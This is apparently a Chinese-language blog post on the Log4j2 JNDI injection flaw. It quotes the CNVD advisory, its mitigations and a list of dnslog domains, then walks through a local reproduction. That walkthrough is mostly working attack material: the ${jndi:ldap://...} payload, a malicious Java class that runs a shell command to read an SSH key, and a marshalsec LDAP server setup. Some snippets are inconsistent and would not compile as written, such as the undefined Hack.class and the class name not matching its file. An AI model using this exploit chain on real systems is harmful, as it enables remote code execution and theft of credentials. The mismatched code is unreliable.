### Bug 背景

2021年12月10日，国家信息安全漏洞共享平台（CNVD）收录了Apache Log4j2远程代码执行漏洞（CNVD-2021-95914）。攻击者利用该漏洞，可在未授权的情况下远程执行代码。目前，漏洞利用细节已公开，Apache官方已发布补丁修复该漏洞。CNVD建议受影响用户立即更新至最新版本，同时采取防范性措施避免漏洞攻击威胁。

<details>
<summary>点击此处查看漏洞详情</summary>

一、漏洞情况分析       Apache Log4j是一个基于Java的日志记录组件。Apache Log4j2是Log4j的升级版本，通过重写Log4j引入了丰富的功能特性。该日志组件被广泛应用于业务系统开发，用以记录程序输入输出日志信息。

        2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。由于Log4j2组件在处理程序日志记录时存在JNDI注入缺陷，未经授权的攻击者利用该漏洞，可向目标服务器发送精心构造的恶意数据，触发Log4j2组件解析缺陷，实现目标服务器的任意代码执行，获得目标服务器权限。

     CNVD对该漏洞的综合评级为“高危”。

二、漏洞影响范围      漏洞影响的产品版本包括：

      Apache Log4j2 2.0 - 2.15.0-rc1

三、漏洞处置建议      目前，Apache官方已发布新版本完成漏洞修复，CNVD建议用户尽快进行自查，并及时升级至最新版本：

https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2

       建议同时采用如下临时措施进行漏洞防范：

1）添加jvm启动参数-Dlog4j2.formatMsgNoLookups=true；

2）在应用classpath下添加log4j2.component.properties配置文件，文件内容为log4j2.formatMsgNoLookups=true；

3）JDK使用11.0.1、8u191、7u201、6u211及以上的高版本；

4）部署使用第三方防火墙产品进行安全防护。

       建议使用如下相关应用组件构建网站的信息系统运营者进行自查，如Apache Struts2、Apache Solr、Apache Druid、Apache Flink等，发现存在漏洞后及时按照上述建议进行处置。

5）限制受影响应用对外访问互联网，并在边界对dnslog相关域名访问进行检测。
   
      部分公共dnslog平台如下：
      - ceye.io
      - dnslog.link
      - dnslog.cn
      - dnslog.io
      - tu4.org
      - burpcollaborator.net
      - s0x.cn

附：参考链接：

https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2

</details>


### 复现漏洞

1. 创建 Maven 项目，引入以下 package

   ```xml
   <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-core</artifactId>
      <version>2.14.1</version>
   </dependency>

   <dependency>
      <groupId>org.apache.logging.log4j</groupId>
      <artifactId>log4j-api</artifactId>
      <version>2.14.1</version>
   </dependency>
   ```

2. resources 文件下创建 log2j.xml 文件，作为 log4j 的配置文件
   
   ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <Configuration>
        <Appenders>
            <Console name="CONSOLE" target="SYSTEM_OUT">
                <PatternLayout pattern="%d %-5p [%t] (%F:%L) - %m%n"/>
            </Console>
        </Appenders>
        <Loggers>
            <Root level="info">
                <AppenderRef ref="CONSOLE"/>
            </Root>
        </Loggers>
    </Configuration>
   ```
   
3. src 文件下创建 Main.java 文件

   ```java
    import org.apache.logging.log4j.Logger;
    import org.apache.logging.log4j.LogManager;
       
    public class Main { 
        private static final Logger logger = LogManager.getLogger(Hack.class);
        public static void main(String[] args) {
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
        logger.error("${jndi:ldap://127.0.0.1:1389/Log4jRCE}");
      }
    }
   ```

4. 在项目外找一个目录创建 `AttackLog4j.java` 文件

   ```java
    public class Log4jRCE {    
    static {
        System.out.println("I am attacker from remote!!!");
        Process p;
        String [] cmd = {"cat", "/Users/hua/.ssh/id_rsa.pub"}; 
        try {
            p = java.lang.Runtime.getRuntime().exec(cmd);
            InputStream fis = p.getInputStream();
            InputStreamReader isr = new InputStreamReader(fis);    
            BufferedReader br = new BufferedReader(isr);    
            String line = null; 
            while((line=br.readLine())!=null) {
                 System.out.println(line);
            }
        }    
        catch (IOException e) {    
             e.printStackTrace();
        }
     }    
   }
   ```
   编译改文件为 class 文件，`javac AttackLog4j.java` 得到 `AttackLog4j.class`;

5. 在 AttackLog4j 文件目录启动 Python HTTP 服务器
   
   ```shell
    python3 -m http.server 8888
    Serving HTTP on :: port 8888 (http://[::]:8888/) ...
   ```
   
6. 本地启动一个 LDAP 服务器

   ```shell
    git clone git@github.com:bkfish/Apache-Log4j-Learning.git
    cd Apache-Log4j-Learning/tools
    java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
   ```
   
7. 运行 `Main.java`，可以看到服务器输出了日志

   ```shell
    I am attacker from remote!!!
    ssh-rsa sdsdwedQEsdadf4wsdwSD3sdfsdF2sdSDf/sdf3esdfsawssdfw3sfd= hua@abc.com
    2021-12-13 15:56:11,205 ERROR [main] (Main.java:13) - ${jndi:ldap://127.0.0.1:1389/Log4jRCE}
   ```

这段测试没有表面看没有太大的意义，只是输出了服务器的公钥，细想如果更改 AttackLog4j 的代码逻辑，后果可能就很严重了。


### 攻击过程

攻击者在网页表单的输入框里输入注入攻击语句，在提交表单时，被服务器端的Log4j框架作为日志输出，但由于该库的某些解析构造漏洞，会把${}括号中的语句作为命令执行。攻击者的注入攻击语句经过解析会先访问ldap服务器，然后由ldap解析出我们要的文件名为Log4jRCE，ldap向HTTP服务器请求获取这个文件，最后网站服务器在本地实例化并执行这个java类，即攻击者的攻击脚本得到执行。